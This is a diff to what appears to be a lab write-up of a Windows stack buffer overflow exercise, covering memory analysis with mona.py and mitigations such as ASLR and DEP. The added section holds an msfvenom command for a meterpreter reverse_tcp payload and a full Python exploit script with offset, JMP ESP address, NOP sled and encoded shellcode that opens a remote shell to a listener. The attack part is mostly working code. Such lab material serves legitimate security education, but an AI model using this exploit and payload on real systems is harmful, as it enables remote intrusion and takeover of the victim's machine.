@@ -241,32 +241,105 @@ The memory space of the application was analyzed to study loaded modules and eva
 Particular attention was given to mechanisms such as Address Space Layout Randomization (ASLR), Data Execution Prevention (DEP), and SafeSEH. This phase helped explain why the application was susceptible to memory corruption attacks and highlighted the importance of secure software design.
 
 ```
-!mona find -s "\xff\xe4" -m qt5core.dll
+!mona modules
 ```
- _Using mona.py to find qt5core.dll opcode_
+ _Using mona.py to find module with no protection_
 
  ![Memory Analysis](images/5_noProtectionModule.png)
-
-0x68e05735  →  \x35\x57\xe0\x68  (Little Endian)
- _JMP ESP address selected_
 
 #### Evidence
 
 ![JMP-ESP selected](images/5_jmpSelected.png)
 
+
+0x68e05735  →  \x35\x57\xe0\x68  (Little Endian)
+ _JMP ESP address selected_
+
 ---
 
 ### Phase 6: Final Validation
 
-The laboratory concluded with the validation of the complete vulnerability analysis process in the controlled environment.
+The final stage focused on evaluating the security implications of the discovered vulnerability and reviewing defensive measures that could prevent similar issues.
 
-#### Objectives
+Several mitigation techniques were studied, including secure coding practices, memory protection technologies, software updates, network segmentation, and vulnerability management processes.
 
-- Verify reproducibility.
-- Confirm understanding of exploitation workflow.
+This phase reinforced the importance of combining offensive security knowledge with defensive security principles to improve the overall resilience of software systems.
+
+_Generating Shellcode_
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp -b "\x00" LHOST=<IP_KALI> LPORT=4444 -f py
+```
+
+_Setting Up the Listener_
+
+![Final Validation](images/6_listener.png)
+
+_Exploit Used:_
+
+```Python
+import socket
+
+TARGET_IP = "127.0.0.1"
+TARGET_PORT = 8888
+
+EXACT_OFFSET = 1052
+JMP_ESP = "\x35\x57\xe0\x68"
+
+buf =  b""
+buf += b"\xba\xa9\x9e\xdf\xbe\xdb\xc6\xd9\x74\x24\xf4\x58"
+buf += b"\x33\xc9\xb1\x5e\x83\xc0\x04\x31\x50\x11\x03\x50"
+buf += b"\x11\xe2\x5c\x62\x37\x31\x9e\x9b\xc8\x2e\xaf\x49"
+buf += b"\xac\x25\x9d\x5d\xa4\xdf\xaa\xcc\xba\x94\xfe\xe4"
+buf += b"\xf3\x55\xf1\xb3\xbe\x8f\x86\xce\x16\xe1\x58\x82"
+buf += b"\x5b\x60\x24\xd9\x8f\x42\x15\x12\xc2\x83\x52\xe4"
+buf += b"\xa8\x6c\x0e\xa0\xd9\x21\xbe\xc5\x9c\xf9\xbf\x09"
+buf += b"\xab\x42\xc7\x2c\x6c\x36\x7b\x2e\xbd\x3c\xdb\x10"
+buf += b"\x6d\xc8\x93\x48\x8c\x1d\xa6\xa0\xfa\x9d\x99\xcd"
+buf += b"\x4a\x55\xed\xba\x4c\xbf\x3c\x7d\xe2\xfe\xf1\x70"
+buf += b"\xfa\xc7\x35\x6b\x89\x33\x46\x16\x8a\x87\x35\xcc"
+buf += b"\x1f\x18\x9d\x87\xb8\xfc\x1c\x4b\x5e\x76\x12\x20"
+buf += b"\x14\xd0\x36\xb7\xf9\x6a\x42\x3c\xfc\xbc\xc3\x06"
+buf += b"\xdb\x18\x88\xdd\x42\x38\x74\xb3\x7b\x5a\xd0\x6c"
+buf += b"\xde\x10\xf2\x7b\x5e\xd9\x0d\x84\x02\x4e\xc2\x49"
+buf += b"\xbd\x8e\x4c\xd9\xce\xbc\xd3\x71\x59\x8d\x9c\x5f"
+buf += b"\x9e\x84\x8a\x5f\x70\x2e\xda\xa1\x71\x4f\xf3\x65"
+buf += b"\x25\x1f\x6b\x4f\x46\xf4\x6b\x70\x93\x61\x61\xe6"
+buf += b"\xdc\xde\x11\xed\xb4\x1c\xd9\x0b\x4f\xa8\x3f\x7b"
+buf += b"\x1f\xfa\xef\x3c\xcf\xba\x5f\xd5\x05\x35\x80\xc5"
+buf += b"\x25\x9f\xa9\x6c\xca\x76\x82\x18\x73\xd3\x58\xb8"
+buf += b"\x7c\xc9\x25\xfa\xf7\xf8\xda\xb5\xff\x89\xc8\xa2"
+buf += b"\x67\x72\x10\x33\x02\x72\x7a\x37\x84\x25\x12\x35"
+buf += b"\xf1\x02\xbd\xc6\xd4\x10\xb9\x39\xa9\x20\xb2\x0c"
+buf += b"\x3f\x0d\xac\x70\xaf\x8d\x2c\x27\xa5\x8d\x44\x9f"
+buf += b"\x9d\xdd\x71\xe0\x0b\x72\x2a\x75\xb4\x23\x9f\xde"
+buf += b"\xdc\xc9\xc6\x29\x43\x31\x2d\x2a\x84\xcd\xb0\x05"
+buf += b"\x2d\xa6\x4a\x16\xcd\x36\x20\x96\x9d\x5e\xbf\xb9"
+buf += b"\x12\xaf\x40\x10\x7b\xa7\xcb\xf5\xc9\x56\xcc\xdf"
+buf += b"\x8c\xc6\xcd\xec\x14\xf8\xb4\x9d\xab\xf9\x49\xb4"
+buf += b"\xcf\xf9\x4a\xb8\xf1\xc6\x9d\x81\x87\x09\x1e\xb6"
+buf += b"\x88\x97\x8a\xc3\x20\x0e\x5f\x6e\x2d\xb1\x8a\xad"
+buf += b"\x48\x32\x3e\x4e\xaf\x2a\x4b\x4b\xeb\xec\xa0\x21"
+buf += b"\x64\x99\xc6\x96\x85\x88"
+
+nop_sled = "\x90" * 16
+
+
+payload = "A" * EXACT_OFFSET
+payload += JMP_ESP
+payload += nop_sled
+payload += buf
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect((TARGET_IP, TARGET_PORT))
+client.send(payload)
+client.close()
+
+print("-> Payload send, check your meterpreter session")
+```
 
 #### Evidence
 
-![Final Validation](images/final-validation.png)
+![Final Validation](images/6_finalResult.png)
 
 ---
